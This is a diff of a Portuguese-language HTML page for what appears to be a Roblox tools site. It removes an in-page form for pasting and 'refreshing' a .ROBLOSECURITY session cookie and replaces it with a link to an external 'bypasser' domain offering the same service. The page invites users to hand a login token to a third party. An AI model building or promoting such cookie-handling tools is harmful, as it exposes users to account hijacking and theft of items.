@@ -2245,105 +2245,19 @@
           <div class="tab-panel" data-panel="x3">
             <div class="site-section-header">
               <span class="site-section-badge">01</span>
-              <span class="site-section-title">Cookie Refresher</span>
+              <span class="site-section-title">Refresher Cookie</span>
             </div>
-
-            <div class="rfr-wrap">
-
-              <!-- Input -->
-              <div class="rfr-input-card">
-                <div class="rfr-input-header">
-                  <div class="rfr-input-icon">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/><path d="M9 3h6M9 21h6"/></svg>
-                  </div>
-                  <div>
-                    <div class="rfr-input-title">Cole o Cookie</div>
-                    <div class="rfr-input-sub">Cole o .ROBLOSECURITY abaixo para verificar e atualizar</div>
-                  </div>
-                </div>
-                <div class="rfr-input-body">
-                  <textarea
-                    id="rfrCookieInput"
-                    class="rfr-textarea"
-                    placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_XXXXXXXXXXXX..."
-                    spellcheck="false"
-                    autocomplete="off"
-                    autocorrect="off"
-                  ></textarea>
-                  <button class="rfr-btn" id="rfrVerifyBtn">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg>
-                    VERIFICAR &amp; ATUALIZAR
-                  </button>
-                </div>
+            <div class="site-list-card">
+              <div class="site-list-icon">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red-glow)" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg>
               </div>
-
-              <!-- Error -->
-              <div class="rfr-error" id="rfrError">
-                <span class="rfr-error-icon">
-                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 8v4M12 16h.01"/></svg>
-                </span>
-                <span id="rfrErrorMsg">Cookie inválido ou expirado.</span>
-              </div>
-
-              <!-- Result -->
-              <div class="rfr-result" id="rfrResult">
-
-                <!-- Profile card -->
-                <div class="rfr-profile-card">
-                  <div class="rfr-profile-header">
-                    <div class="rfr-avatar-wrap">
-                      <img id="rfrAvatar" class="rfr-avatar" src="" alt="avatar" style="display:none;">
-                      <div id="rfrAvatarPlaceholder" class="rfr-avatar-placeholder">
-                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
-                      </div>
-                      <div class="rfr-avatar-badge" id="rfrStatusBadge" style="display:none;"></div>
-                    </div>
-                    <div class="rfr-user-info">
-                      <div class="rfr-username" id="rfrUsername">—</div>
-                      <div class="rfr-userid" id="rfrUserId">ID: —</div>
-                      <div class="rfr-premium-badge" id="rfrPremium" style="display:none;">
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
-                        PREMIUM
-                      </div>
-                    </div>
-                  </div>
-                  <div class="rfr-stats-grid">
-                    <div class="rfr-stat-cell">
-                      <span class="rfr-stat-label">Robux</span>
-                      <span class="rfr-stat-value gold" id="rfrRobux">—</span>
-                    </div>
-                    <div class="rfr-stat-cell">
-                      <span class="rfr-stat-label">Status</span>
-                      <span class="rfr-stat-value green" id="rfrStatus">—</span>
-                    </div>
-                    <div class="rfr-stat-cell">
-                      <span class="rfr-stat-label">Criado em</span>
-                      <span class="rfr-stat-value" id="rfrCreated" style="font-size:13px;">—</span>
-                    </div>
-                    <div class="rfr-stat-cell">
-                      <span class="rfr-stat-label">Amigos</span>
-                      <span class="rfr-stat-value" id="rfrFriends">—</span>
-                    </div>
-                  </div>
-                </div>
-
-                <!-- New cookie card -->
-                <div class="rfr-cookie-card">
-                  <div class="rfr-cookie-header">
-                    <span class="rfr-cookie-label">
-                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 01-15.36 6.36L3 16"/><path d="M3 21v-5h5"/><path d="M3 12a9 9 0 0115.36-6.36L21 8"/><path d="M21 3v5h-5"/></svg>
-                      Cookie Atualizado
-                    </span>
-                    <button class="rfr-copy-btn" id="rfrCopyBtn">
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
-                      Copiar
-                    </button>
-                  </div>
-                  <div class="rfr-cookie-body">
-                    <div class="rfr-cookie-value" id="rfrCookieOut">—</div>
-                  </div>
-                </div>
-
+              <div class="site-list-body">
+                <span class="site-list-tag">Refresher 01</span>
+                <div class="site-list-title">REFRESHER COOKIE</div>
+                <div class="tutorial-desc" style="margin-bottom:16px;">Ferramenta exclusiva para atualizar e validar o seu cookie .ROBLOSECURITY de forma rápida e segura.</div>
+                <a class="site-list-btn" href="https://www.rblxbypasser.xyz/cookie-refresher" target="_blank" rel="noopener noreferrer">
+                  <span>→</span> Acessar rblxbypasser.xyz
+                </a>
               </div>
             </div>
           </div>
